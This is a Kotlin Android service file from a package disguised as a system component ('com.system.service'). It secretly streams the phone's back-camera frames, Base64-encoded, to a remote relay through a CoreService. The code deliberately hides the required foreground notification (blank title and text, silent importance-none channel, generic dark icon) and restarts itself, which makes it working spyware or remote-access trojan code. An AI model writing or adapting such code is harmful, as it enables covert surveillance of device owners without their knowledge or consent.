package com.system.service.monitors

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.util.Base64
import com.system.service.core.CoreService
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

class CameraStreamService : Service() {

    companion object {
        var isRunning = false
        private const val CHANNEL_ID = "cam_stream"
        private const val NOTIF_ID   = 11
    }

    private val streaming  = AtomicBoolean(false)
    private val lastSentAt = AtomicLong(0L)
    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    // 60fps = 16ms, 30fps = 33ms — minimum 16ms, default 33ms (30fps)
    private var intervalMs: Long = 33L
    // Single background thread for encoding — avoids per-frame thread creation
    private val encodeExecutor = Executors.newSingleThreadExecutor()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
        createChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, buildNotif(), ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIF_ID, buildNotif())
        }
        // 60fps = 16ms | 30fps = 33ms | 20fps = 50ms | minimum 16ms
        intervalMs = (intent?.getLongExtra("interval", 33L) ?: 33L).coerceAtLeast(16L)
        isRunning = true
        streaming.set(true)
        startCamera()
        return START_STICKY
    }

    private fun startCamera() {
        thread = HandlerThread("CamStream", Process.THREAD_PRIORITY_URGENT_DISPLAY).apply { start() }
        handler = Handler(thread!!.looper)

        val mgr = getSystemService(CAMERA_SERVICE) as CameraManager

        // BACK camera for monitoring (more reliable than front)
        val camId = mgr.cameraIdList.firstOrNull { id ->
            mgr.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
        } ?: mgr.cameraIdList.firstOrNull() ?: return

        val chars = mgr.getCameraCharacteristics(camId)
        val map   = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
        val sizes = map.getOutputSizes(ImageFormat.JPEG)

        // Best balanced size: 480p range for low-lag but readable quality
        val sorted = sizes.sortedBy { it.width * it.height }
        val size = sorted.firstOrNull { it.width >= 480 } ?: sorted.last()

        // 5 buffers: GPU-rendered frames — prevents blocking when relay momentarily slow
        imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 5)
        imageReader!!.setOnImageAvailableListener({ reader ->
            val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val now = System.currentTimeMillis()
                if (now - lastSentAt.get() < intervalMs) { img.close(); return@setOnImageAvailableListener }
                lastSentAt.set(now)

                // Pull bytes off the Image immediately (before close)
                val buf   = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                img.close()

                // Encode + send on dedicated thread — never blocks camera callback thread
                val w = size.width; val h = size.height
                encodeExecutor.execute {
                    try {
                        CoreService.instance?.sendData("camera_frame", JSONObject().apply {
                            put("frame", Base64.encodeToString(bytes, Base64.NO_WRAP))
                            put("w", w); put("h", h)
                        })
                    } catch (_: Exception) {}
                }
            } catch (_: Exception) { try { img.close() } catch (_: Exception) {} }
        }, handler)

        try {
            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    cameraDevice = cam
                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                        addTarget(imageReader!!.surface)
                        // VIDEO_RECORD intent: camera pipeline optimizes for throughput > latency
                        set(CaptureRequest.CONTROL_CAPTURE_INTENT, CaptureRequest.CONTROL_CAPTURE_INTENT_VIDEO_RECORD)
                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO)
                        // Disable OIS (adds latency)
                        set(CaptureRequest.LENS_OPTICAL_STABILIZATION_MODE, CaptureRequest.LENS_OPTICAL_STABILIZATION_MODE_OFF)
                    }.build()
                    cam.createCaptureSession(listOf(imageReader!!.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                if (!streaming.get()) { s.close(); return }
                                session = s
                                try {
                                    // setRepeatingRequest: camera sends frames as fast as possible
                                    s.setRepeatingRequest(req, null, handler)
                                } catch (_: Exception) {}
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) { stopSelf() }
                        }, handler)
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close(); cameraDevice = null }
                override fun onError(cam: CameraDevice, e: Int) { cam.close(); cameraDevice = null; stopSelf() }
            }, handler)
        } catch (_: SecurityException) { stopSelf() }
    }

    private fun stopStream() {
        streaming.set(false); isRunning = false
        try { session?.stopRepeating() }  catch (_: Exception) {}
        try { session?.close() }          catch (_: Exception) {}
        try { cameraDevice?.close() }     catch (_: Exception) {}
        try { imageReader?.close() }      catch (_: Exception) {}
        thread?.quitSafely()
        encodeExecutor.shutdown()
    }

    private fun createChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Camera", NotificationManager.IMPORTANCE_NONE)
            .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotif() = Notification.Builder(this, CHANNEL_ID)
        .setContentTitle("").setContentText("")
        .setSmallIcon(android.R.drawable.screen_background_dark).build()

    override fun onDestroy() { stopStream(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
